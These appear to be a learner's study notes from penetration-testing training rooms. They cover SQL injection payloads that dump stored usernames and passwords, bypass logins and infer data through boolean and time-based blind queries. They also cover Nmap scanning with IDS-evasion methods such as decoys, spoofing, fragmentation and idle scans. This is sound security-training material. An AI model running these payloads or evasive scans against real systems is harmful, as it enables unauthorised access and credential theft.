  As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.
  0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

  This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.

  The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.
  0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


  Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.


###Blind SQLi - Authentication Bypass

Authentication Bypass
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

  We could use ' or 1=1;--

###Blind SQLi - Boolean based
admin123' UNION SELECT 1,2,3 where database() like '%';--

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

admin123' UNION SELECT 1,2,3 where database() like 's%';--

###Blind SQLi - Time based
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

URL: It involves exchanging characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). Url encoding is an extremely useful method to know for any kind of web application testing.
For example, let's encode the forward-slash character (/). The ASCII character code for a forward slash is 47. This is "2F" in hexadecimal, making the URL encoded forward-slash %2F.

HTML: Encoding text as HTML Entities involves replacing special characters with an ampersand (&) followed by either a hexadecimal number or a reference to the character being escaped, then a semicolon (;). For example, a quotation mark has its own reference: &quot;. When this is inserted into a webpage, it will be replaced by a double quotation mark ("). This encoding method allows special characters in the HTML language to be rendered safely in HTML pages and has the added bonus of being used to prevent attacks such as XSS (Cross-Site Scripting).

Base64: Another widely used encoding method, base64 is used to encode any data in an ASCII-compatible format. It was designed to take binary data (e.g. images, media, programs) and encode it in a format that would be suitable to transfer over virtually any medium

ASCII Hex: This option converts data between ASCII representation and hexadecimal representation. For example, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each letter in the original data is taken individually and converted from numeric ASCII representation into hexadecimal. For example, the letter "A" in ASCII has a decimal character code of 65. In hexadecimal, this is 41. Similarly, the letter "S" can be converted to hexadecimal 53, and so on.

ping

On Linux, traceroute will start by sending UDP datagrams within IP packets of TTL being 1. Thus, it causes the first router to encounter a TTL=0 and send an ICMP Time-to-Live exceeded back. Hence, a TTL of 1 will reveal the IP address of the first router to you. Then it will send another packet with TTL=2; this packet will be dropped at the second router. And so on.

*The number of hops/routers between your system and the target system depends on the time you are running traceroute. There is no guarantee that your packets will always follow the same route, even if you are on the same network or you repeat the traceroute command within a short time.
*Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
*Some routers don’t return a reply

nmap01

We present the different approaches that Nmap uses to discover live hosts. In particular, we cover:

    ARP scan: This scan uses ARP requests to discover live hosts
    ICMP scan: This scan uses ICMP requests to identify live hosts
    TCP/UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.

We also introduce two scanners, arp-scan and masscan, and explain how they overlap with part of Nmap’s host discovery.

Starting from bottom to top, we can use:

    ARP from Link Layer
    ICMP from Network Layer
    TCP from Transport Layer
    UDP from Transport Layer

ICMP has many types. ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply).
-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using ARP 
If you want to ping a system on the same subnet, an ARP query should precede the ICMP Echo.

Although TCP and UDP are transport layers, for network scanning purposes, a scanner can send a specially-crafted packet to common TCP or UDP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked.


There are various ways to discover online hosts. When no host discovery options are provided, Nmap follows the following approaches to discover live hosts:

    When a privileged user tries to scan targets on a local network (Ethernet), Nmap uses ARP requests. A privileged user is root or a user who belongs to sudoers and can run sudo.
    When a privileged user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.
    When an unprivileged user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.

Nmap, by default, uses a ping scan to find live hosts, then proceeds to scan live hosts only. If you want to use Nmap to discover online hosts without port-scanning the live systems, you can issue nmap -sn TARGETS. Let’s dig deeper to gain a solid understanding of the different techniques used.

ARP scan is possible only if you are on the same subnet as the target systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the MAC address of any system before you can communicate with it. The MAC address is necessary for the link-layer header; the header contains the source MAC address and the destination MAC address among other fields. To get the MAC address, the OS sends an ARP query. A host that replies to ARP queries is up. The ARP query only works if the target is on the same subnet as yourself, i.e., on the same Ethernet/WiFi. You should expect to see many ARP queries generated during a Nmap scan of a local network. If you want Nmap only to perform an ARP scan without port-scanning, you can use nmap -PR -sn TARGETS, where -PR indicates that you only want an ARP scan. The following example shows Nmap using ARP for host discovery without any port scanning. We run nmap -PR -sn MACHINE_IP/24 to discover all the live systems on the same subnet as our target machine.

nmap -PR -sn 10.10.223.163/24

arp-scan --localnet OR arp-scan -l 
arp-scan -I eth0 -l

Host Discovery using ICMP
To use ICMP echo request to discover live hosts, add the option -PE. (Remember to add -sn if you don’t want to follow that with a port scan.) As shown in the following figure, an ICMP echo scan works by sending an ICMP echo request and expects the target to reply with an ICMP echo reply if it is online.

#ICMP Echo
nmap -PE -sn 10.10.223.163/24
###The scan output shows that eight hosts are up; moreover, it shows their MAC addresses. Generally speaking, we don’t expect to learn the MAC addresses of the targets unless they are on the same subnet as our system. The output above indicates that Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.###

Because ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14). Adding the -PP option tells Nmap to use ICMP timestamp requests.

#ICMP Timestamp
nmap -PP -sn 10.10.223.163/24

Similarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option -PM.
#ICMP Address Mask
nmap -PM -sn 10.10.223.163/24
-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using TCP and UDP
If you want Nmap to use TCP SYN ping, you can do so via the option -PS followed by the port number, range, list, or a combination of them. For example, -PS21 will target port 21, while -PS21-25 will target ports 21, 22, 23, 24, and 25. Finally -PS80,443,8080 will target the three ports 80, 443, and 8080.

Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open, as shown in the figure below. Unprivileged users have no choice but to complete the 3-way handshake if the port is open.

#TCP SYN ping
nmap -PS -sn MACHINE_IP/24 
#Technically speaking, since we didn’t specify any TCP ports to use in the TCP ping scan, Nmap used common ports; in this case, it is TCP port 80. Any service listening on port 80 is expected to reply, indirectly indicating that the host is online.


TCP ACK Ping

As you have guessed, this sends a packet with an ACK flag set. You must be running Nmap as a privileged user to be able to accomplish this. If you try it as an unprivileged user, Nmap will attempt a 3-way handshake.

By default, port 80 is used. The syntax is similar to TCP SYN ping. -PA should be followed by a port number, range, list, or a combination of them. For example, consider -PA21, -PA21-25 and -PA80,443,8080. If no port is specified, port 80 will be used.

The following figure shows that any TCP packet with an ACK flag should get a TCP packet back with an RST flag set. The target responds with the RST flag set because the TCP packet with the ACK flag is not part of any ongoing connection. The expected response is used to detect if the target host is up.

In this example, we run sudo nmap -PA -sn MACHINE_IP/24 to discover the online hosts on the target’s subnet

-=-=-=-=
UDP Ping

Finally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.

In the following figure, we see a UDP packet sent to an open UDP port and not triggering any response. However, sending a UDP packet to any closed UDP port can trigger a response indirectly indicating that the target is online.

The syntax to specify the ports is similar to that of TCP SYN ping and TCP ACK ping; Nmap uses -PU for UDP ping.

-=-=-==-
Masscan
However, to finish its network scan quickly, Masscan is quite aggressive with the rate of packets it generates. The syntax is quite similar: -p can be followed by a port number, list, or range. Consider the following examples:

    masscan MACHINE_IP/24 -p443
    masscan MACHINE_IP/24 -p80,443
    masscan MACHINE_IP/24 -p22-25
    masscan MACHINE_IP/24 ‐‐top-ports 100

-=-==-=-=-=-=-=-=-
Using reverse-dns lookup 
Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use -n to skip this step.

By default, Nmap will look up online hosts; however, you can use the option -R to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the --dns-servers DNS_SERVER option


SUMMARY
Scan Type 	        Example Command
ARP Scan 	        sudo nmap -PR -sn MACHINE_IP/24
ICMP Echo Scan 	        sudo nmap -PE -sn MACHINE_IP/24
ICMP Timestamp Scan 	sudo nmap -PP -sn MACHINE_IP/24
ICMP Address Mask Scan 	sudo nmap -PM -sn MACHINE_IP/24
TCP SYN Ping Scan 	sudo nmap -PS22,80,443 -sn MACHINE_IP/30
TCP ACK Ping Scan 	sudo nmap -PA22,80,443 -sn MACHINE_IP/30
UDP Ping Scan 	        sudo nmap -PU53,161,162 -sn MACHINE_IP/30

Remember to add -sn if you are only interested in host discovery without port-scanning. Omitting -sn will let Nmap default to port-scanning the live hosts.
Option 	Purpose
-n 	no DNS lookup
-R 	reverse-DNS lookup for all hosts
-sn 	host discovery only. Don't scan ports, just probe to see if the host exists
–traceroute: uses an existing probe method to do a full traceroute. Very clever way to map a network even when most stuff is shut down; if you can get a response from, say, ICMP timestamps you can use that to do the traceroute.



    -Pn: no discovery, just assume the host is up.
    -PS: TCP SYN. Tries to open a TCP port; getting back an ACK or RST will both confirm the host is online, so it works whether the port is open or not. Default is port 80, do “-PS99” or whatever to change the port number.
    -PA: TCP ACK. Sends a bogus ACK, expecting a RST back.
    -PU: UDP. Should get an ICMP port unreachable response.
    -PY: SCTP INIT. Similar to -PS, but tries to open an SCTP connection.
    -PE: ICMP echo. Good ol ping
    -PP: ICMP timestamp. One of those tech dead ends that should be removed or disabled (indeed, it’s not present in IPv6). My Linux server seems to respond with the correct time!
    -PM: ICMP address mask. A way to query the subnet mask. Kind of a useful thing really, but Linux doesn’t seem to answer it. Maybe disabled for security?
    -PO: IP protocol ping. Sends unusual IP protocol requests; ICMP, IGMP, and IP-in-IP by default. My Linux datacenter box doesn’t respond to IGMP or IP-in-IP probes.
    -PR: ARP ping. For local ethernets only, bypasses the kernel’s ARP handling and handles ARP itself.  Any ARP reply implies the host exists. Note this is on by default for local networks and short-circuits other types of requests.

Scanning ports with NMAP
Nmap considers the following six states:

    Open: indicates that a service is listening on the specified port.
    Closed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.
    Filtered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.
    Unfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.
    Open|Filtered: This means that Nmap cannot determine whether the port is open or filtered.
    Closed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.

TCP flags in the TCP header
Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are:

    URG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.
    ACK: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.
    PSH: Push flag asking TCP to pass the data to the application promptly.
    RST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.
    SYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.
    FIN: The sender has no more data to send.

-=-=-=-
TCP connect scan
We are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST/ACK. You can choose to run TCP connect scan using -sT. It is important to note that if you are not a privileged user (root or sudoer), a TCP connect scan is the only possible option to discover open TCP ports.  A closed TCP port responds to a SYN packet with RST/ACK to indicate that it is not open
-sT 

SYN>
<SYN,ACK 
ACK>
RST,ACK>

Note that we can use -F to enable fast mode and decrease the number of scanned ports from 1000 to 100 most common ports.

It is worth mentioning that the -r option can also be added to scan the ports in consecutive order instead of random order. This option is useful when testing whether ports open in a consistent manner, for instance, when a target boots up
-=-=-=-==-
TCP SYN Scan 
Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server. Because we didn’t establish a TCP connection, this decreases the chances of the scan being logged. We can select this scan type by using the -sS option

We can see a TCP connect scan -sT traffic. Any open TCP port will require Nmap to complete the TCP 3-way handshake before closing the connection. In the lower half of the following figure, we see how a SYN scan -sS does not need to complete the TCP 3-way handshake; instead, Nmap sends an RST packet once a SYN/ACK packet is received.

TCP SYN scan is the default scan mode when running Nmap as a privileged user, running as root or using sudo, and it is a very reliable choice

-=-=-=-=-=
UDP Scan 
UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned. You can select UDP scan using the -sU option; moreover, you can combine it with another TCP scan.

The following figure shows that if we send a UDP packet to an open UDP port, we cannot expect any reply in return. Therefore, sending a UDP packet to an open port won’t tell us anything.

However, as shown in the figure below, we expect to get an ICMP packet of type 3, destination unreachable, and code 3, port unreachable. In other words, the UDP ports that don’t generate any response are the ones that Nmap will state as open.
-=-=-=-=-
Fine tuning 


You can specify the ports you want to scan instead of the default 1000 ports. Specifying the ports is intuitive by now. Let’s see some examples:

    port list: -p22,80,443 will scan ports 22, 80 and 443.
    port range: -p1-1023 will scan all ports between 1 and 1023 inclusive, while -p20-25 will scan ports between 20 and 25 inclusive.

You can request the scan of all ports by using -p-, which will scan all 65535 ports. If you want to scan the most common 100 ports, add -F. Using --top-ports 10 will check the ten most common ports.

You can control the scan timing using -T<0-5>. -T0 is the slowest (paranoid), while -T5 is the fastest. According to Nmap manual page, there are six templates:

    paranoid (0)
    sneaky (1)
    polite (2)
    normal (3)
    aggressive (4)
    insane (5)

To avoid IDS alerts, you might consider -T0 or -T1. For instance, -T0 scans one port at a time and waits 5 minutes between sending each probe, so you can guess how long scanning one target would take to finish. If you don’t specify any timing, Nmap uses normal -T3. Note that -T5 is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that -T4 is often used during CTFs and when learning to scan on practice targets, whereas -T1 is often used during real engagements where stealth is more important.

Alternatively, you can choose to control the packet rate using --min-rate <number> and --max-rate <number>. For example, --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.

Moreover, you can control probing parallelization using --min-parallelism <numprobes> and --max-parallelism <numprobes>. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.

Summary 
This room covered three types of scans.
Port Scan Type 	        Example Command
TCP Connect Scan 	nmap -sT MACHINE_IP
TCP SYN Scan 	        sudo nmap -sS MACHINE_IP

-=-=-=-=-=-=-=-
NMAP advanced port scans


Let’s start with the following three types of scans:

    Null Scan
    FIN Scan
    Xmas Scan


TCP Null Scan

The null scan does not set any flag; all six flag bits are set to zero. You can choose this scan using the -sN option. A TCP packet with no flags set will not trigger any response when it reaches an open port, as shown in the figure below. Therefore, from Nmap’s perspective, a lack of reply in a null scan indicates that either the port is open or a firewall is blocking the packet.

However, we expect the target server to respond with an RST packet if the port is closed. Consequently, we can use the lack of RST response to figure out the ports that are not closed: open or filtered
 Because the null scan relies on the lack of a response to infer that the port is not closed, it cannot indicate with certainty that these ports are open; there is a possibility that the ports are not responding due to a firewall rule.

-=-=
TCP FIN Scan

The FIN scan sends a TCP packet with the FIN flag set. You can choose this scan type using the -sF option. Similarly, no response will be sent if the TCP port is open. Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port.

However, the target system should respond with an RST if the port is closed. Consequently, we will be able to know which ports are closed and use this knowledge to infer the ports that are open or filtered. It's worth noting some firewalls will 'silently' drop the traffic without sending an RST.

-=-=-=-
TCP Xmas Scan

The Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously. You can select Xmas scan with the option -sX.

Like the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.


On scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.

-=-=-=
TCP Maimon scan
In this scan, the FIN and ACK bits are set. The target should send an RST packet as a response. However, certain BSD-derived systems drop the packet if it is an open port exposing the open ports. This scan won’t work on most targets encountered in modern networks; however, we include it in this room to better understand the port scanning mechanism and the hacking mindset. To select this scan type, use the -sM option.

Most target systems respond with an RST packet regardless of whether the TCP port is open. In such a case, we won’t be able to discover the open ports. The figure below shows the expected behaviour in the cases of both open and closed TCP ports
As mentioned, because open ports and closed ports are behaving the same way, the Maimon scan could not discover any open ports on the target system.
This type of scan is not the first scan one would pick to discover a system; however, it is important to know about it as you don’t know when it could come in handy

-=-=-=-=-=-=-=-
This task will cover how to perform a TCP ACK scan, a TCP window scan, and how to create your custom flag scan.

TCP ACK Scan

Let’s start with the TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. Use the -sA option to choose this scan. As we show in the figure below, the target would respond to the ACK with RST regardless of the state of the port. This behaviour happens because a TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data, unlike our case. Hence, this scan won’t tell us whether the target port is open in a simple setup.

This kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more suitable to discover firewall rule sets and configuration.

After setting up the target VM 10.10.255.227 with a firewall, we repeated the ACK scan. This time, we received some interesting results. As seen in the console output below, we have three ports that aren't being blocked by the firewall. This result indicates that the firewall is blocking all other ports except for these three ports.



Window Scan

Another similar scan is the TCP window scan. The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open. You can select this scan type with the option -sW. As shown in the figure below, we expect to get an RST packet in reply to our “uninvited” ACK packets, regardless of whether the port is open or closed.

However, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. In the console output shown below, the TCP window scan pointed that three ports are detected as closed. (This is in contrast with the ACK scan that labelled the same three ports as unfiltered.) Although we know that these three ports are not closed, we realize they responded differently, indicating that the firewall does not block them.


Custom Scan

If you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using --scanflags. For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using --scanflags RSTSYNFIN. As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.

Finally, it is essential to note that the ACK scan and the window scan were very efficient at helping us map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.

-=-=-=-=-=-
Spoofing and Decoys 

n some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. Such a scan is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, chances are you won’t have any response routed to you, and the scan results could be unreliable.

The following figure shows the attacker launching the command nmap -S SPOOFED_IP 10.10.255.227. Consequently, Nmap will craft all the packets using the provided source IP address SPOOFED_IP. The target machine will respond to the incoming packets sending the replies to the destination IP address SPOOFED_IP. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.


In brief, scanning with a spoofed IP address is three steps:

    Attacker sends a packet with a spoofed source IP address to the target machine.
    Target machine replies to the spoofed IP address as the destination.
    Attacker captures the replies to figure out open ports.

In general, you expect to specify the network interface using -e and to explicitly disable ping scan -Pn. Therefore, instead of nmap -S SPOOFED_IP 10.10.255.227, you will need to issue nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.255.227 to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply. It is worth repeating that this scan will be useless if the attacker system cannot monitor the network for responses.

When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using --spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).

Spoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, make the scan appears to be coming from many IP addresses so that the attacker’s IP address would be lost among them. As we see in the figure below, the scan of the target machine will appear to be coming from 3 different sources, and consequently, the replies will go the decoys as well.

You can launch a decoy scan by specifying a specific or random IP address after -D. For example, nmap -D 10.10.0.1,10.10.0.2,ME 10.10.255.227 will make the scan of 10.10.255.227 appear as coming from the IP addresses 10.10.0.1, 10.10.0.2, and then ME to indicate that your IP address should appear in the third order. Another example command would be nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.255.227, where the third and fourth source IP addresses are assigned randomly, while the fifth source is going to be the attacker’s IP address. In other words, each time you execute the latter command, you would expect two new random IP addresses to be the third and fourth decoy sources.

Fragmented packets

Firewall

A firewall is a piece of software or hardware that permits packets to pass through or blocks them. It functions based on firewall rules, summarized as blocking all traffic with exceptions or allowing all traffic with exceptions. For instance, you might block all traffic to your server except those coming to your web server. A traditional firewall inspects, at least, the IP header and the transport layer header. A more sophisticated firewall would also try to examine the data carried by the transport layer.

IDS

An intrusion detection system (IDS) inspects network packets for select behavioural patterns or specific content signatures. It raises an alert whenever a malicious rule is met. In addition to the IP header and transport layer header, an IDS would inspect the data contents in the transport layer and check if it matches any malicious patterns. How can you make it less likely for a traditional firewall/IDS to detect your Nmap activity? It is not easy to answer this; however, depending on the type of firewall/IDS, you might benefit from dividing the packet into smaller packets.

Fragmented Packets

Nmap provides the option -f to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another -f (-f -f or -ff) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the --mtu; however, you should always choose a multiple of 8.

To properly understand fragmentation, we need to look at the IP header in the figure below. It might look complicated at first, but we notice that we know most of its fields. In particular, notice the source address taking 32 bits (4 bytes) on the fourth row, while the destination address is taking another 4 bytes on the fifth row. The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.


Let’s compare running sudo nmap -sS -p80 10.20.30.144 and sudo nmap -sS -p80 -f 10.20.30.144. As you know by now, this will use stealth TCP SYN scan on port 80; however, in the second command, we are requesting Nmap to fragment the IP packets.

In the first two lines, we can see an ARP query and response. Nmap issued an ARP query because the target is on the same Ethernet. The second two lines show a TCP SYN ping and a reply. The fifth line is the beginning of the port scan; Nmap sends a TCP SYN packet to port 80. In this case, the IP header is 20 bytes, and the TCP header is 24 bytes. Note that the minimum size of the TCP header is 20 bytes.

With fragmentation requested via -f, the 24 bytes of the TCP header will be divided into multiples of 8 bytes, with the last fragment containing 8 bytes or less of the TCP header. Since 24 is divisible by 8, we got 3 IP fragments; each has 20 bytes of IP header and 8 bytes of TCP header. We can see the three fragments between the fifth and the seventh lines.

Note that if you added -ff (or -f -f), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.

On the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option --data-length NUM, where num specifies the number of bytes you want to append to your packets.
-=-=-=-=-
Idle/Zombie Scan 
Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.

The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using nmap -sI ZOMBIE_IP 10.10.148.44, where ZOMBIE_IP is the IP address of the idle host (zombie).

The idle (zombie) scan requires the following three steps to discover whether a port is open:

    Trigger the idle host to respond so that you can record the current IP ID on the idle host.
    Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
    Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.

Let’s explain with figures. In the figure below, we have the attacker system probing an idle machine, a multi-function printer. By sending a SYN/ACK, it responds with an RST packet containing its newly incremented IP ID.

1. The attacker will send a SYN packet to the TCP port they want to check on the target machine in the next step. However, this packet will use the idle host (zombie) IP address as the source. Three scenarios would arise. In the first scenario, shown in the figure below, the TCP port is closed; therefore, the target machine responds to the idle host with an RST packet. The idle host does not respond; hence its IP ID is not incremented.

2. In the second scenario, as shown below, the TCP port is open, so the target machine responds with a SYN/ACK to the idle host (zombie). The idle host responds to this unexpected packet with an RST packet, thus incrementing its IP ID.

3. In the third scenario, the target machine does not respond at all due to firewall rules. This lack of response will lead to the same result as with the closed port; the idle host won’t increase the IP ID.

For the final step, the attacker sends another SYN/ACK to the idle host. The idle host responds with an RST packet, incrementing the IP ID by one again. The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. If the difference is 1, it means the port on the target machine was closed or filtered. However, if the difference is 2, it means that the port on the target was open.

It is worth repeating that this scan is called an idle scan because choosing an idle host is indispensable for the accuracy of the scan. If the “idle host” is busy, all the returned IP IDs would be useless.

Service Detection

Adding -sV to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9.

It is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.

-=-=-=
OS detection and traceroute 
-O 
The OS detection is very convenient, but many factors might affect its accuracy. First and foremost, Nmap needs to find at least one open and one closed port on the target to make a reliable guess. Furthermore, the guest OS fingerprints might get distorted due to the rising use of virtualization and similar technologies. Therefore, always take the OS version with a grain of salt.

Traceroute

If you want Nmap to find the routers between you and the target, just add --traceroute. In the following example, Nmap appended a traceroute to its scan results. Note that Nmap’s traceroute works slightly different than the traceroute command found on Linux and macOS or tracert found on MS Windows. Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.

t is worth mentioning that many routers are configured not to send ICMP Time-to-Live exceeded, which would prevent us from discovering their IP addresses

-=-=-=
Nmap scripting engine (NSE)

You can specify to use any or a group of these installed scripts; moreover, you can install other user’s scripts and use them for your scans. Let’s begin with the default scripts. You can choose to run the scripts in the default category using --script=default or simply adding -sC. In addition to default, categories include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. A brief description is shown in the following table.
Script Category 	Description
auth 	                Authentication related scripts
broadcast 	        Discover hosts by sending broadcast messages
brute 	                Performs brute-force password auditing against logins
default 	        Default scripts, same as -sC
discovery 	        Retrieve accessible information, such as database tables and DNS names
dos 	                Detects servers vulnerable to Denial of Service (DoS)
exploit 	        Attempts to exploit various vulnerable services
external 	        Checks using a third-party service, such as Geoplugin and Virustotal
fuzzer 	                Launch fuzzing attacks
intrusive 	        Intrusive scripts such as brute-force attacks and exploitation
malware 	        Scans for backdoors

Protocols and servers 

The $ indicates that this is not a root terminal.
FTP
A command like STAT can provide some added information. The SYST command shows the System Type of the target (UNIX in this case). PASV switches the mode to passive. It is worth noting that there are two modes for FTP:

    Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.
    Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.

The command TYPE A switches the file transfer mode to ASCII, while TYPE I switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.

FTP could be secured using SSL/TLS by using the FTPS protocol which uses port 990. It is worth mentioning that FTP can also be secured using the SSH protocol which is the SFTP protocol. By default this service listens on port 22, just like SSH

